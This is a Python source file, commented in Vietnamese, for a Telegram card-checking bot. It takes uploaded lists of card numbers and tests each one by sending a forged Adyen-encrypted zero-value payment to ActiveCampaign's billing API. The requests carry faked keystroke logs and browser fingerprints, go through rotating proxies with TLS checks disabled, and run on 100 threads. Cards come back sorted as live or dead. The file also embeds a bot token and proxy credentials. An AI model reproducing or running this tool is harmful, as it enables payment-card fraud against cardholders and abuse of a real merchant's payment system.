import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
from datetime import datetime
from colorama import Fore, init, Style
import io
import threading
import queue
import psutil  # Thư viện xem CPU/RAM

# Thư viện Bot Telegram
import telebot
from telebot import types

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# Khởi tạo colorama
init(autoreset=True)

# Khóa luồng
print_lock = threading.Lock()

# ===================================================================
# === CẤU HÌNH BOT TELEGRAM
# ===================================================================
API_TOKEN = '8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I'  # <--- THAY TOKEN CỦA BẠN VÀO ĐÂY
bot = telebot.TeleBot(API_TOKEN)

# Biến toàn cục quản lý trạng thái tasks
user_tasks = {}

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    # Xử lý tháng
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    # Xử lý năm (chuyển 2 số thành 4 số)
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn cho số thẻ."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    """Tạo timestamp theo định dạng ISO 8601 UTC."""
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180) 
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key: incorrect split parts")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")

    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://www.mytheresa.com"
        
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": "1", 
            "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", 
            "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": "1", 
            "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", 
            "cvcFieldKeyCount": "3", 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "2"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
        
    return encrypted_details

# ===================================================================
# === PHẦN 3: GENERATE DESKTOP PROFILE
# ===================================================================

def generate_browser_profile():
    chrome_version = random.randint(120, 131)
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    return {
        "user_agent": user_agent,
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 4: HÀM CHECK THẺ (CORE LOGIC) - ĐÃ SỬA ĐỂ TRẢ VỀ KẾT QUẢ
# ===================================================================

def check_card_process(line_card):
    # Thời gian bắt đầu xử lý thẻ này
    start_time_card = time.time()
    
    # Chuẩn hóa
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        return {"status": "ERROR", "msg": "FORMAT_ERROR", "raw": line_card, "time": 0}

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        return {"status": "ERROR", "msg": "LUHN_FAIL", "raw": normalized, "time": 0}

    # Cấu hình API Key
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    max_retries = 20
    current_try = 0
    success_request = False

    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy Rotation
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception as e:
            pass
        
        current_try += 1
        time.sleep(1)

    # Tính toán thời gian
    end_time_card = time.time()
    time_taken = round(end_time_card - start_time_card, 2)

    if not success_request:
        return {"status": "ERROR", "msg": "NETWORK_FAIL", "raw": normalized, "time": time_taken}

    # Trích xuất dữ liệu
    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "APPROVED"
        msg = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # Coi như die vì 3DS
        msg = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}"
    
    return {
        "status": status,
        "result_string": result_string,
        "time": time_taken
    }

# ===================================================================
# === PHẦN 5: BOT LOGIC & MULTI-THREADING MANAGER
# ===================================================================

def worker(chat_id, q):
    """Hàm xử lý cho từng luồng."""
    while True:
        try:
            card = q.get(timeout=1)
        except queue.Empty:
            return

        try:
            res = check_card_process(card)
            
            # Cập nhật thống kê
            task = user_tasks.get(chat_id)
            if task:
                task['checked'] += 1
                if res['status'] == 'APPROVED':
                    task['live'] += 1
                    task['live_list'].append(f"{res['result_string']} - Time: {res['time']}s")
                elif res['status'] == 'DIE':
                    task['die'] += 1
                    task['die_list'].append(f"{res['result_string']} - Time: {res['time']}s")
                else:
                    task['error'] += 1
        except Exception as e:
            # Lỗi không mong muốn trong worker
            pass
        finally:
            q.task_done()

def dashboard_thread(chat_id, message_id, start_time):
    """Luồng cập nhật tin nhắn realtime."""
    while True:
        task = user_tasks.get(chat_id)
        if not task or task['checked'] >= task['total']:
            break
        
        # Tính toán chỉ số
        elapsed = time.time() - start_time
        if elapsed == 0: elapsed = 1
        cpm = int((task['checked'] / elapsed) * 60)
        
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent
        
        text = (
            f"⚡ **Checking Status** ⚡\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💳 Total: `{task['total']}`\n"
            f"✅ Checked: `{task['checked']}`\n"
            f"🟢 Live: `{task['live']}`\n"
            f"🔴 Die: `{task['die']}`\n"
            f"⚠️ Error: `{task['error']}`\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🚀 CPM: `{cpm}`\n"
            f"🖥 CPU: `{cpu_usage}%` | RAM: `{ram_usage}%`\n"
            f"⏳ Elapsed: `{int(elapsed)}s`"
        )
        
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown")
        except:
            pass # Bỏ qua lỗi nếu tin nhắn không thay đổi hoặc mạng lag
        
        time.sleep(1) # Cập nhật mỗi 1 giây

    # Cập nhật lần cuối khi xong
    task = user_tasks.get(chat_id)
    if task:
        elapsed = time.time() - start_time
        text = (
            f"✅ **COMPLETED** ✅\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💳 Total: `{task['total']}`\n"
            f"🟢 Live: `{task['live']}`\n"
            f"🔴 Die: `{task['die']}`\n"
            f"⏱ Time Taken: `{int(elapsed)}s`"
        )
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown")
        except:
            pass

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "👋 Xin chào! Gửi file `.txt` chứa thẻ để bắt đầu check.\nHoặc dùng `/st <cc|mm|yy|cvv>` để check lẻ.")

@bot.message_handler(commands=['st'])
def single_check(message):
    try:
        args = message.text.split()[1]
        card_info = args
    except IndexError:
        bot.reply_to(message, "⚠️ Vui lòng nhập đúng định dạng: `/st cc|mm|yy|cvv`")
        return

    msg = bot.reply_to(message, "🔄 Đang kiểm tra...")
    
    # Chạy check (blocking vì chỉ 1 thẻ)
    res = check_card_process(card_info)
    
    status_icon = "✅" if res['status'] == 'APPROVED' else "🔴" if res['status'] == 'DIE' else "⚠️"
    
    response_text = (
        f"{status_icon} **Result:** `{res['status']}`\n"
        f"📄 `{res['result_string']}`\n"
        f"⏱ Time taken: `{res['time']}s`"
    )
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=response_text, parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        chat_id = message.chat.id
        
        # Kiểm tra nếu đang chạy task cũ
        if chat_id in user_tasks and user_tasks[chat_id]['checked'] < user_tasks[chat_id]['total']:
            bot.reply_to(message, "⚠️ Bạn đang có một tiến trình đang chạy. Vui lòng đợi.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Đọc file từ bộ nhớ
        content = downloaded_file.decode('utf-8', errors='ignore')
        cards = [line.strip() for line in content.split('\n') if line.strip()]
        
        if not cards:
            bot.reply_to(message, "⚠️ File rỗng!")
            return

        total_cards = len(cards)
        sent_msg = bot.reply_to(message, f"🚀 Đã nhận {total_cards} thẻ. Đang khởi động 100 luồng...")
        
        # Khởi tạo Task
        user_tasks[chat_id] = {
            'total': total_cards,
            'checked': 0,
            'live': 0,
            'die': 0,
            'error': 0,
            'live_list': [],
            'die_list': []
        }
        
        q = queue.Queue()
        for card in cards:
            q.put(card)
            
        # Chạy Dashboard Thread
        start_time = time.time()
        dash_t = threading.Thread(target=dashboard_thread, args=(chat_id, sent_msg.message_id, start_time))
        dash_t.start()
        
        # Chạy Worker Threads
        num_threads = 100 # Yêu cầu 100 luồng
        threads = []
        
        def run_workers():
            for _ in range(num_threads):
                t = threading.Thread(target=worker, args=(chat_id, q))
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            
            # Sau khi xong hết thread -> Gửi file kết quả
            finish_task(chat_id)

        # Chạy trình quản lý worker ở background để không block bot
        threading.Thread(target=run_workers).start()
        
    except Exception as e:
        bot.reply_to(message, f"Lỗi: {e}")

def finish_task(chat_id):
    """Gửi file kết quả sau khi check xong."""
    task = user_tasks.get(chat_id)
    if not task: return
    
    # Tạo file Live
    if task['live_list']:
        live_file = f"Live_{chat_id}.txt"
        with open(live_file, "w", encoding="utf-8") as f:
            f.write("\n".join(task['live_list']))
        with open(live_file, "rb") as f:
            bot.send_document(chat_id, f, caption=f"✅ Live Cards ({len(task['live_list'])})")
        os.remove(live_file)
        
    # Tạo file Die
    # Tùy chọn: Có thể không gửi file Die nếu quá nặng, nhưng user yêu cầu
    if task['die_list']:
        die_file = f"Die_{chat_id}.txt"
        with open(die_file, "w", encoding="utf-8") as f:
            f.write("\n".join(task['die_list']))
        # Chỉ gửi nếu file < 50MB (Telegram limit)
        try:
            with open(die_file, "rb") as f:
                bot.send_document(chat_id, f, caption=f"🔴 Die Cards ({len(task['die_list'])})")
        except:
            bot.send_message(chat_id, "⚠️ File Die quá lớn để gửi.")
        os.remove(die_file)

    # Clean up memory
    del user_tasks[chat_id]

# ===================================================================
# === MAIN LOOP
# ===================================================================

if __name__ == '__main__':
    print(f"{Fore.GREEN}[BOT] Bot is running on Ubuntu...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Bot Error: {e}")
